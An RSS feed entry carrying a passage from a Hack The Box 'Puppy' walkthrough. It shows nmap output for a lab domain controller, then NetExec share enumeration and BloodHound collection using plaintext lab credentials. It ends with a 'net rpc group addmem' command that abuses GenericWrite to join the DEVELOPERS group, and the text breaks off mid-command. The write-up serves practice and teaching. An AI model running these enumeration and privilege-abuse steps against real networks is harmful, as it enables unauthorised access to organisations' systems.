<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Css on R4zi0</title><link>https://r4z1o.github.io/tags/css/</link><description>Recent content in Css on R4zi0</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 22 May 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://r4z1o.github.io/tags/css/index.xml" rel="self" type="application/rss+xml"/><item><title>Puppy HTB Writeup</title><link>https://r4z1o.github.io/p/puppy-htb-writeup/</link><pubDate>Thu, 22 May 2025 00:00:00 +0000</pubDate><guid>https://r4z1o.github.io/p/puppy-htb-writeup/</guid><description>&lt;img src="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy.png" alt="Featured image of post Puppy HTB Writeup" />&lt;p>Nmap scan.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;span class="lnt">67
&lt;/span>&lt;span class="lnt">68
&lt;/span>&lt;span class="lnt">69
&lt;/span>&lt;span class="lnt">70
&lt;/span>&lt;span class="lnt">71
&lt;/span>&lt;span class="lnt">72
&lt;/span>&lt;span class="lnt">73
&lt;/span>&lt;span class="lnt">74
&lt;/span>&lt;span class="lnt">75
&lt;/span>&lt;span class="lnt">76
&lt;/span>&lt;span class="lnt">77
&lt;/span>&lt;span class="lnt">78
&lt;/span>&lt;span class="lnt">79
&lt;/span>&lt;span class="lnt">80
&lt;/span>&lt;span class="lnt">81
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> 10.10.11.70 &lt;span class="o">(&lt;/span>10.10.11.70&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up, received user-set &lt;span class="o">(&lt;/span>0.14s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Scanned at 2025-05-19 13:04:52 +01 &lt;span class="k">for&lt;/span> 191s
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">985&lt;/span> filtered tcp ports &lt;span class="o">(&lt;/span>no-response&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Bug in iscsi-info: no string output.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE REASON VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">53/tcp open domain syn-ack ttl &lt;span class="m">127&lt;/span> Simple DNS Plus
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">88/tcp open kerberos-sec syn-ack ttl &lt;span class="m">127&lt;/span> Microsoft Windows Kerberos &lt;span class="o">(&lt;/span>server time: 2025-05-20 01:04:53Z&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">111/tcp open rpcbind syn-ack ttl &lt;span class="m">127&lt;/span> 2-4 &lt;span class="o">(&lt;/span>RPC &lt;span class="c1">#100000)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> rpcinfo:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> program version port/proto service
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100000&lt;/span> 2,3,4 111/tcp rpcbind
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100000&lt;/span> 2,3,4 111/tcp6 rpcbind
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100000&lt;/span> 2,3,4 111/udp rpcbind
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100000&lt;/span> 2,3,4 111/udp6 rpcbind
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100003&lt;/span> 2,3 2049/udp nfs
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100003&lt;/span> 2,3 2049/udp6 nfs
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100005&lt;/span> 1,2,3 2049/udp mountd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100005&lt;/span> 1,2,3 2049/udp6 mountd
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100021&lt;/span> 1,2,3,4 2049/tcp nlockmgr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100021&lt;/span> 1,2,3,4 2049/tcp6 nlockmgr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100021&lt;/span> 1,2,3,4 2049/udp nlockmgr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100021&lt;/span> 1,2,3,4 2049/udp6 nlockmgr
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100024&lt;/span> &lt;span class="m">1&lt;/span> 2049/tcp status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100024&lt;/span> &lt;span class="m">1&lt;/span> 2049/tcp6 status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">100024&lt;/span> &lt;span class="m">1&lt;/span> 2049/udp status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">100024&lt;/span> &lt;span class="m">1&lt;/span> 2049/udp6 status
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">135/tcp open msrpc syn-ack ttl &lt;span class="m">127&lt;/span> Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">139/tcp open netbios-ssn syn-ack ttl &lt;span class="m">127&lt;/span> Microsoft Windows netbios-ssn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">389/tcp open ldap syn-ack ttl &lt;span class="m">127&lt;/span> Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: PUPPY.HTB0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">445/tcp open microsoft-ds? syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">464/tcp open kpasswd5? syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">593/tcp open ncacn_http syn-ack ttl &lt;span class="m">127&lt;/span> Microsoft Windows RPC over HTTP 1.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">636/tcp open tcpwrapped syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2049/tcp open nlockmgr syn-ack ttl &lt;span class="m">127&lt;/span> 1-4 &lt;span class="o">(&lt;/span>RPC &lt;span class="c1">#100021)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3260/tcp open iscsi? syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3268/tcp open ldap syn-ack ttl &lt;span class="m">127&lt;/span> Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: PUPPY.HTB0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3269/tcp open tcpwrapped syn-ack ttl &lt;span class="m">127&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5985/tcp open http syn-ack ttl &lt;span class="m">127&lt;/span> Microsoft HTTPAPI httpd 2.0 &lt;span class="o">(&lt;/span>SSDP/UPnP&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Not Found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Warning: OSScan results may be unreliable because we could not find at least &lt;span class="m">1&lt;/span> open and &lt;span class="m">1&lt;/span> closed port
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Device type: general purpose
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Running &lt;span class="o">(&lt;/span>JUST GUESSING&lt;span class="o">)&lt;/span>: Microsoft Windows 2022&lt;span class="p">|&lt;/span>2012&lt;span class="p">|&lt;/span>&lt;span class="m">2016&lt;/span> &lt;span class="o">(&lt;/span>89%&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Aggressive OS guesses: Microsoft Windows Server &lt;span class="m">2022&lt;/span> &lt;span class="o">(&lt;/span>89%&lt;span class="o">)&lt;/span>, Microsoft Windows Server &lt;span class="m">2012&lt;/span> R2 &lt;span class="o">(&lt;/span>85%&lt;span class="o">)&lt;/span>, Microsoft Windows Server &lt;span class="m">2016&lt;/span> &lt;span class="o">(&lt;/span>85%&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No exact OS matches &lt;span class="k">for&lt;/span> host &lt;span class="o">(&lt;/span>&lt;span class="nb">test&lt;/span> conditions non-ideal&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TCP/IP fingerprint:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SCAN&lt;span class="o">(&lt;/span>&lt;span class="nv">V&lt;/span>&lt;span class="o">=&lt;/span>7.95%E&lt;span class="o">=&lt;/span>4%D&lt;span class="o">=&lt;/span>5/19%OT&lt;span class="o">=&lt;/span>53%CT&lt;span class="o">=&lt;/span>%CU&lt;span class="o">=&lt;/span>%PV&lt;span class="o">=&lt;/span>Y%G&lt;span class="o">=&lt;/span>N%TM&lt;span class="o">=&lt;/span>682B1F23%P&lt;span class="o">=&lt;/span>x86_64-pc-linux-gnu&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SEQ&lt;span class="o">(&lt;/span>&lt;span class="nv">SP&lt;/span>&lt;span class="o">=&lt;/span>104%GCD&lt;span class="o">=&lt;/span>1%ISR&lt;span class="o">=&lt;/span>10C%TI&lt;span class="o">=&lt;/span>I%II&lt;span class="o">=&lt;/span>I%SS&lt;span class="o">=&lt;/span>S%TS&lt;span class="o">=&lt;/span>A&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SEQ&lt;span class="o">(&lt;/span>&lt;span class="nv">SP&lt;/span>&lt;span class="o">=&lt;/span>106%GCD&lt;span class="o">=&lt;/span>1%ISR&lt;span class="o">=&lt;/span>10D%TI&lt;span class="o">=&lt;/span>I%II&lt;span class="o">=&lt;/span>I%SS&lt;span class="o">=&lt;/span>S%TS&lt;span class="o">=&lt;/span>A&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OPS&lt;span class="o">(&lt;/span>&lt;span class="nv">O1&lt;/span>&lt;span class="o">=&lt;/span>M552NW8ST11%O2&lt;span class="o">=&lt;/span>M552NW8ST11%O3&lt;span class="o">=&lt;/span>M552NW8NNT11%O4&lt;span class="o">=&lt;/span>M552NW8ST11%O5&lt;span class="o">=&lt;/span>M552NW8ST11%O6&lt;span class="o">=&lt;/span>M552ST11&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WIN&lt;span class="o">(&lt;/span>&lt;span class="nv">W1&lt;/span>&lt;span class="o">=&lt;/span>FFFF%W2&lt;span class="o">=&lt;/span>FFFF%W3&lt;span class="o">=&lt;/span>FFFF%W4&lt;span class="o">=&lt;/span>FFFF%W5&lt;span class="o">=&lt;/span>FFFF%W6&lt;span class="o">=&lt;/span>FFDC&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ECN&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%TG&lt;span class="o">=&lt;/span>80%W&lt;span class="o">=&lt;/span>FFFF%O&lt;span class="o">=&lt;/span>M552NW8NNS%CC&lt;span class="o">=&lt;/span>Y%Q&lt;span class="o">=)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">T1&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%TG&lt;span class="o">=&lt;/span>80%S&lt;span class="o">=&lt;/span>O%A&lt;span class="o">=&lt;/span>S+%F&lt;span class="o">=&lt;/span>AS%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">T2&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>N&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">T3&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>N&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">T4&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>N&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">U1&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>N&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">IE&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DFI&lt;span class="o">=&lt;/span>N%TG&lt;span class="o">=&lt;/span>80%CD&lt;span class="o">=&lt;/span>Z&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Uptime guess: 0.024 days &lt;span class="o">(&lt;/span>since Mon May &lt;span class="m">19&lt;/span> 12:33:49 2025&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">TCP Sequence Prediction: &lt;span class="nv">Difficulty&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">262&lt;/span> &lt;span class="o">(&lt;/span>Good luck!&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">IP ID Sequence Generation: Incremental
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Host: DC&lt;span class="p">;&lt;/span> OS: Windows&lt;span class="p">;&lt;/span> CPE: cpe:/o:microsoft:windows
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host script results:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb2-security-mode:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> 3:1:1:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Message signing enabled and required
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> p2p-conficker:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Checking &lt;span class="k">for&lt;/span> Conficker.C or higher...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Check &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>port 62785/tcp&lt;span class="o">)&lt;/span>: CLEAN &lt;span class="o">(&lt;/span>Timeout&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Check &lt;span class="m">2&lt;/span> &lt;span class="o">(&lt;/span>port 47994/tcp&lt;span class="o">)&lt;/span>: CLEAN &lt;span class="o">(&lt;/span>Timeout&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Check &lt;span class="m">3&lt;/span> &lt;span class="o">(&lt;/span>port 26380/udp&lt;span class="o">)&lt;/span>: CLEAN &lt;span class="o">(&lt;/span>Timeout&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Check &lt;span class="m">4&lt;/span> &lt;span class="o">(&lt;/span>port 46192/udp&lt;span class="o">)&lt;/span>: CLEAN &lt;span class="o">(&lt;/span>Timeout&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ 0/4 checks are positive: Host is CLEAN or ports are blocked
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_clock-skew: 12h59m43s
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb2-time:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> date: 2025-05-20T01:07:03
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ start_date: N/A
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="foothold-">Foothold :
&lt;/h2>&lt;p>I enumerated shares using &lt;code>NetExec&lt;/code> but nothing interesting is showed up.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">nxc smb puppy.htb -u &lt;span class="s1">&amp;#39;levi.james&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;KingofAkron2025!&amp;#39;&lt;/span> --shares  ✔  14:18:53 
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Windows Server &lt;span class="m">2022&lt;/span> Build &lt;span class="m">20348&lt;/span> x64 &lt;span class="o">(&lt;/span>name:DC&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain:PUPPY.HTB&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> PUPPY.HTB&lt;span class="se">\l&lt;/span>evi.james:KingofAkron2025!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Enumerated shares
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC Share Permissions Remark
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC ----- ----------- ------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC ADMIN$ Remote Admin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC C$ Default share
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC DEV DEV-SHARE &lt;span class="k">for&lt;/span> PUPPY-DEVS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC IPC$ READ Remote IPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC NETLOGON READ Logon server share
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.70 &lt;span class="m">445&lt;/span> DC SYSVOL READ Logon server share
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Since this is credentialed, i used them to gather Bloodhound digest to get a better view of the whole environement.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl"> bloodhound-python -u levi.james -p &lt;span class="s1">&amp;#39;KingofAkron2025!&amp;#39;&lt;/span> -d puppy.htb -ns 10.10.11.70 -c All
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>As we can see our user &lt;code>levi.james&lt;/code> is part of the &lt;code>HR&lt;/code> group, who&amp;rsquo;s members have &lt;code>GenericWrite&lt;/code> over the &lt;code>DEVELOPERS&lt;/code> Group.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy2.png"
width="728"
height="222"
srcset="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy2_hu_5c04e55a8a5528fe.png 480w, https://r4z1o.github.io/p/puppy-htb-writeup/Puppy2_hu_ef81f989f66641ed.png 1024w"
loading="lazy"
alt=" "
class="gallery-image"
data-flex-grow="327"
data-flex-basis="787px"
>&lt;/p>
&lt;p>We can leverage that by adding this user the &lt;code>DEVELOPERS&lt;/code> Group.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">net rpc group addmem &lt;span class="s2">&amp;#34;DEVELOPERS&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;levi.james&amp;#34;&lt;/span> -U &lt;span class="s2">&amp;#34;PUPPY.HTB&amp;#34;&lt;/span>/&lt;span class="s2">&amp;#34;levi.james&amp;#34;&lt;/span>%&lt;span class="s2">&amp;#34;KingofAkron2025\!&amp;#34;&lt;/span> -S &lt;span class="s2">&amp;#34;DC.PUPPY.HTB&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Can&lt;span class="err">&amp;#39;&lt;/span>t load /etc/samba/smb.conf - run testparm to debug it
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>By enumerating shares once again, we can see that we have READ access to the &lt;code>DEV&lt;/code> share.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">nxc smb puppy.htb -u &lt;span class="s1">&amp;#39;levi.james&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;KingofAkron2025!&amp;#39;&lt;/span> --shares
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
